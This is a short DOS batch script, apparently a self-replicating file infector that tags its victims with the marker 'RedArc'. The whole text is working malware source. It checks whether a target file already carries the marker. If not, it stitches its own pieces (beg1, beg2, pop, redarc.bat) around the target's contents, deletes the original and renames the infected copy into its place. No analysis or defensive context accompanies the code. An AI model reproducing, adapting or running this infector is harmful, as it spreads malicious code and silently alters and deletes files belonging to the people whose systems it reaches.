echo off 
find "RedArc" %1 
if errorlevel == 1 goto INF 
goto end 
:INF 
copy beg1 + beg2 + %1 + pop + redarc.bat redarc.dat 
del %1 
ren redarc.dat %1 
:END 
